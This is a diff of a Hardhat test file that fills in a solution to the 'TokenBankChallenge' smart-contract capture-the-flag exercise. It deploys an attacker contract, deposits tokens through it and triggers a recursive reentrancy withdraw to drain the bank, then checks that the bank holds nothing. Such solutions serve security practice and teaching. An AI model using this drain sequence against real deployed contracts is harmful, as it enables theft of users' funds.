@@ -1,47 +1,42 @@
-import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
-import { expect } from 'chai';
-import { Contract } from 'ethers';
-import { ethers } from 'hardhat';
-const { utils } = ethers;
+const { expect } = require('chai');
+const { ethers } = require('hardhat');
 
-const TOTAL_TOKENS_SUPPLY = 1000000;
+describe('TokenBankChallenge', function () {
+  it('should exploit the bank and drain all tokens', async function () {
+    // Deploy the TokenBankChallenge and Token contracts
+    const [deployer, attacker] = await ethers.getSigners();
+    const TokenBankChallenge = await ethers.getContractFactory('TokenBankChallenge', deployer);
+    const bank = await TokenBankChallenge.deploy(attacker.address);
+    await bank.deployed();
+    const tokenAddress = await bank.token();
+    const SimpleERC223Token = await ethers.getContractFactory('SimpleERC223Token', deployer);
+    const token = SimpleERC223Token.attach(tokenAddress);
 
-describe('TokenBankChallenge', () => {
-  let target: Contract;
-  let token: Contract;
-  let attacker: SignerWithAddress;
-  let deployer: SignerWithAddress;
+    // Deploy the TokenBankAttacker contract
+    const TokenBankAttacker = await ethers.getContractFactory('TokenBankAttacker', attacker);
+    const attackerContract = await TokenBankAttacker.deploy(bank.address, token.address);
+    await attackerContract.deployed();
 
-  before(async () => {
-    [attacker, deployer] = await ethers.getSigners();
+    // Attack sequence
+    // Step 1: Attacker withdraws their share of tokens
+    await bank.connect(attacker).withdraw((await bank.balanceOf(attacker.address)).toString());
 
-    const [targetFactory, tokenFactory] = await Promise.all([
-      ethers.getContractFactory('TokenBankChallenge', deployer),
-      ethers.getContractFactory('SimpleERC223Token', deployer),
-    ]);
+    // Step 2: Transfer all attacker's tokens to the Attacker contract
+    await token
+      .connect(attacker)
+      ['transfer(address,uint256)'](
+        attackerContract.address,
+        (await token.balanceOf(attacker.address)).toString()
+      );
 
-    target = await targetFactory.deploy(attacker.address);
+    // Step 3: Attacker contract deposits tokens into the bank
+    await attackerContract.connect(attacker).deposit();
 
-    await target.deployed();
+    // Step 4: Attacker contract initiates the recursive withdraw
+    await attackerContract.connect(attacker).withdraw();
 
-    const tokenAddress = await target.token();
-
-    token = await tokenFactory.attach(tokenAddress);
-
-    await token.deployed();
-
-    target = target.connect(attacker);
-    token = token.connect(attacker);
-  });
-
-  it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
-
-    expect(await token.balanceOf(target.address)).to.equal(0);
-    expect(await token.balanceOf(attacker.address)).to.equal(
-      utils.parseEther(TOTAL_TOKENS_SUPPLY.toString())
-    );
+    // Check if the bank has no tokens left, which means the attack was successful
+    expect(await token.balanceOf(bank.address)).to.equal(0);
+    expect(await bank.isComplete()).to.be.true;
   });
 });
